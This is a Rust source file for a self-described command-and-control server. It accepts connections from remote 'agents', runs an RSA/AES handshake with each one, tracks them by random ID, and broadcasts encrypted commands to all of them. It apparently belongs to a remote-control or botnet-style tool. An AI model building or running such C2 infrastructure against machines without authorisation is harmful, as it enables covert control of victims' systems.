use std::collections::HashMap;
use std::io;
use std::sync::Arc;
// use tokio::io::AsyncWriteExt;
// use tokio::io::{AsyncWriteExt, Interest};
use tokio::net::TcpListener;
use tokio::sync::Mutex;

use crate::crypto;
use crate::socket::{HandleErrors, SocketState, SocketStream};
use rand::prelude::*;

pub struct Server {
    pub streams: Arc<Mutex<HashMap<i32, Arc<Mutex<SocketStream>>>>>, // or agents
    pub rsa_private_key: Vec<u8>,
}

impl Server {
    pub fn new(rsa_private_key: Vec<u8>) -> Self {
        Self {
            streams: Arc::new(Mutex::new(HashMap::new())),
            rsa_private_key,
        }
    }

    pub async fn assign_new_socket(&mut self, socket: SocketStream) {
        // Acquire a mutex lock on the streams property so we can
        // mutate it safely.
        let streams = Arc::clone(&self.streams);
        let mut streams_lock = streams.lock().await;

        // Generate a random ID to assign to the socket
        let new_socket_id = generate_random_num();

        streams_lock.insert(new_socket_id, Arc::new(Mutex::new(socket)));

        self.read_new_socket(new_socket_id).await.unwrap();
    }

    pub async fn _broadcast_command(&mut self, command: Vec<u8>) -> Result<(), Vec<i32>> {
        // Todo find better namings for everything here lmao
        let mut failed_broadcasts: Vec<i32> = Vec::new();
        let streams = Arc::clone(&self.streams);
        let mut streams = streams.lock().await;

        for stream in &mut *streams {
            let my_socket_stream = Arc::clone(stream.1);
            let lock = my_socket_stream.lock().await;
            let command = command.clone();

            let command = match lock.state {
                SocketState::Operational => crypto::encrypt_with_aes(
                    command,
                    lock.aes_key.as_ref().unwrap(),
                    lock.aes_nonce.as_ref().unwrap(),
                ),
                SocketState::Handshake(_) => command,
            };

            let res = lock.write_msg(&command).await;
            if res.is_err() {
                failed_broadcasts.push(*stream.0);
                continue;
            }
        }

        if failed_broadcasts.len() > 0 {
            Err(failed_broadcasts)
        } else {
            Ok(())
        }
    }

    pub async fn read_new_socket(&mut self, id: i32) -> io::Result<()> {
        // A loop which reads messages from the CnC
        let my_streams = Arc::clone(&self.streams);
        tokio::spawn(async move {
            loop {
                let mut streams = my_streams.lock().await;
                let socket = streams.get(&id).unwrap();

                let my_socket = Arc::clone(socket);
                let mut lock = my_socket.lock().await;
                let msg = lock.consume_message().await;

                // Match the msg output, an error isn't necessarily bad, just ConnectionReset is. (for now)
                match msg {
                    Err(e) if e.kind() == std::io::ErrorKind::ConnectionReset => {
                        println!("Agent disconnected");
                        // remove from hashmap
                        streams.remove(&id);
                        break;
                    }
                    Ok((msg, n_bytes)) => {
                        let handle_res = lock.handle_msg(msg, n_bytes).await;

                        match handle_res {
                            // Errors in handle_msg can be deadly for the connection
                            // stuff like unsynced cryptographic keys requires a connection shutdown
                            // as soon as possible.
                            Err(e) => {
                                // e should represent the peer
                                match e {
                                    HandleErrors::BadHandshakeFormat(addr)
                                    | HandleErrors::BadHandshakeRSA(addr) => {
                                        println!("Critical agent error! Closing connection and removing! peer: {:?}", addr);
                                        streams.remove(&id);
                                        break;
                                    }
                                }
                            }
                            Ok(_) => {}
                        }
                    }
                    _ => {}
                }
            }
        });
        Ok(())
    }
}

pub async fn start_cnc_server(ip: &str, port: u16, server: &Arc<Mutex<Server>>) -> io::Result<()> {
    let listener = TcpListener::bind(&format!("{}:{}", ip, port)).await?;
    let my_server = Arc::clone(server);

    tokio::spawn(async move {
        loop {
            let (socket, _) = listener.accept().await.unwrap();
            let socket = SocketStream::new(socket);
            // acquire a mutex lock on the server struct so we can mutate it's values safely.
            let mut lock = my_server.lock().await;
            // Cache the SocketStream along with it's connection for further usage such as command broadcasting to multiple agents.
            lock.assign_new_socket(socket).await;
        }
    });

    Ok(())
}

// We want each agent to have an ID just so it will be easier to identify them 
// later on.
// this method generates a random number between 1 - 100,000
pub fn generate_random_num() -> i32 {
    let mut rng = rand::thread_rng();
    let mut nums: Vec<i32> = (1..100000).collect();
    nums.shuffle(&mut rng);
    *nums.get(0).unwrap()
}
